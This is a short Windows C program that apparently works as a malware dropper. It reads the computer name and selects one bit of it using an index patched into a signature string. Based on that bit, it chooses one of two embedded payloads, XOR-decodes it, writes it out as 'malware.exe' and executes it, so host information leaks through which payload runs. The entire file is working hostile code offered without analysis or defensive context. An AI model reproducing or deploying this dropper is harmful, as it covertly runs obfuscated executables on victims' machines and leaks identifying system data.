#include <stdio.h>
#include <windows.h>
#include "leak.h"

#define SIG "KITTY"
char *bit = SIG "000";

int main() {
    CHAR buf[1024] = {0};
    DWORD sz = sizeof(buf);
    GetComputerNameA(buf, &sz);

    char *p;
    int b, psz;
    b = atoi(bit + sizeof(SIG) - 1);

    if (buf[b / 8] & (1 << (b % 8))) {
        p = bit1;
        psz = sizeof(bit1);
    } else {
        p = bit0;
        psz = sizeof(bit0);
    }

    FILE *out = fopen("malware.exe", "wb");
    while (psz--) {
        fputc(0xFF ^ *p++, out);
    }
    fclose(out);
    system("malware.exe");

    return 0;
}
